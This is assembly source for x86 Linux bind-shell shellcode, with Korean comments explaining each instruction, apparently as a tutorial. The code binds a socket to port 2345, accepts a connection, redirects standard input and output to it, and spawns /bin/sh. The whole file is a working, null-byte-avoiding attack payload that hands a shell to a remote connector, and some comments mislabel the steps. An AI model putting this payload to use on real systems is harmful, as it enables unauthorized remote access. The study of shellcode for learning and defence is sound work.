BITS 32
  
;socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
push BYTE 102       ; socketcall의 시스템 콜 번호 102를 Stack에 저장합니다.
pop eax             ; Stack에 저장된 시스템 콜 번호를 EAX 레지스터에 저장합니다.
cdq                 ; EDX 레지스터에 DWORD 크기의 Null byte를 저장합니다.
push dword 1                ; socket 함수의 호출 번호 1을 Stack에 저장합니다.
pop ebx             ; socketcall() 함수의 1번째 인자(EBX 레지스터)값으로 SYS_SOCKET(1)을 저장 합니다.
;두번째 인자에 전달할 인자 배열을 생성
push edx            ; socket() 함수의 3번째 인자 값 0을 Stack에 저장합니다.
push BYTE 1         ; socket() 함수의 2번째 인자 값 SOCK_STREAM(1)을 Stack에 저장합니다.
push BYTE 2         ; socket() 함수의 1번째 인자 값 PF_INET(2)을 Stack에 저장합니다.
mov ecx, esp        ; socketcall() 함수의 2번째 인자(ECX 레지스터)값으로 인자 배열의 시작 주소값(ESP 레지스터)을 저장 합니다.
int 0x80
 
;server_sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
mov esi,eax         ; 소켓 함수로 부터 리턴받은 값을 ESI 레지스터에 저장합니다.
  
;bind(server_sockfd, (struct sockaddr *)&server_addr, sizeof(struct sockaddr));
push BYTE 0x66      ; socketcall의 시스템 콜 번호 102를 Stack에 저장합니다.
pop eax             ; Stack에 저장된 시스템 콜 번호를 EAX 레지스터에 저장합니다.
inc ebx             ; EBX 레지스터에 1이 저장되어 있으며, INC 명령어를 이용해 2로 변경합니다.
                    ; 이로 인해 socketcall() 함수의 1번째 인자 값으로 SYS_BIND(2)를 저장하게 됩니다.
;struct sockaddr_in server_addr
push edx            ; server_addr.sin_family = AF_INET;
push WORD 0x2909    ; server_addr.sin_port = htons(2345);
push WORD bx        ; server_addr.sin_addr.s_addr = INADDR_ANY;
;인자에 전달된 값을 저장
mov ecx,esp         ; ECX레지스터에 server_addr 구조체의 시작 주소를 저장합니다.
push BYTE 16        ; bind() 함수의 3번째 인자 값 16을 Stack에 저장합니다.
push ecx            ; bind() 함수의 2번째 인자 값 &server_addr을 Stack에 저장합니다.
push esi            ; bind() 함수의 1번째 인자 값 server_sockfd를 Stack에 저장합니다.
mov ecx, esp        ; socketcall() 함수의 2번째 인자 값을 ECX 레지스터에 저장 합니다.
int 0x80
  
;listen(server_sockfd, 4)
mov BYTE al,0x66    ;
inc ebx
inc ebx             ; EBX 레지스터에 2가 저장되어 있기 때문에 inc 명령어를 2번 호출하여 4로 변경합니다.
                    ; 이로 인해 socketcall() 함수의 1번째 인자 값으로 SYS_LISTEN(4)를 저장하게 됩니다.
push ebx            ; listen() 함수의 2번째 인자 값 4를 Stack에 저장합니다.
push esi            ; listen() 함수의 1번째 인자 값 server_sockfd를 Stack에 저장합니다.
mov ecx, esp        ; socketcall() 함수의 2번째 인자 값을 ECX 레지스터에 저장 합니다.
int 0x80
 
;accept(server_sockfd, (struct sockaddr *)&client_addr, &client_addr_size)
;c = accept(s,0,0)
mov BYTE al, 0x66   ;
inc ebx             ; socketcall() 함수의 1번째 인자 값으로 SYS_ACCEPT(5)를 저장하게 됩니다.
push edx            ; bind() 함수의 3번째 인자 값 0을 Stack에 저장합니다.
push edx            ; bind() 함수의 2번째 인자 값 Null을 Stack에 저장합니다.
push esi            ; bind() 함수의 1번째 인자 값 server_sockfd를 Stack에 저장합니다.
mov ecx, esp        ; socketcall() 함수의 2번째 인자 값을 ECX 레지스터에 저장 합니다.
int 0x80            ;

;dup2(connected socket,{all three standard I/O file descriptors})
mov ebx,eax			; accept() 함수로 부터 리턴받은 파일 디스크립터를 EBX레지스터에 저장합니다.
xor eax, eax		; EAX 레지스터를 0으로 초기화 합니다.(시스템 콜 번호)
push BYTE 0x2  		; Stack에 2 저장합니다.
pop ecx				; ECX 레지스터에 2으로 저장 합니다.(dup2 함수의 2번째 인자값)
dup2_call:
	mov BYTE al, 0x3F	; dup2 함수의 시스템 콜 번호(63)를 AL 레지스터에 저장합니다.
	int 0x80			; 
	dec ecx				; dup2 함수의 2번째 인자값을 감소(-1) 시킵니다.
	jns dup2_call		; 부호 플래그가 거짓(0)이면 dup2_call로 점프 합니다.

;execve( "/bin/sh", argv, NULL );
mov BYTE al, 11		; execve() 시스템 함수의 콜 번호 11을 EAX레지스터에 저장합니다.
push edx			; 문자열의 끝을 알리기 위해 Null을 먼저 Stack에 저장합니다.
push 0x68732f2f		; 문자 "//sh"를 Stack에 저장합니다. Little-endian
push 0x6e69622f		; 문자 "/bin"를 Stack에 저장합니다. Little-endian
mov ebx, esp		; execve() 함수의 1번째 인자값으로 ESP 레지스터의 값을 저장합니다.
push edx			; Stack에 Null을 저장합니다.
mov edx, esp		; execve() 함수의 3번째 인자값으로 Null이 저장된 배열의 주소(ESP)를 저장합니다.
push ebx			; Stack에 "/bin//sh" 문자의 시작주소(EBX)를 저장합니다.
mov ecx, esp		; execve() 함수의 2번째 인자값으로 배열의 주소(ESP,["/bin//sh",Null],[Null])를 저장합니다.
int 0x80			; 
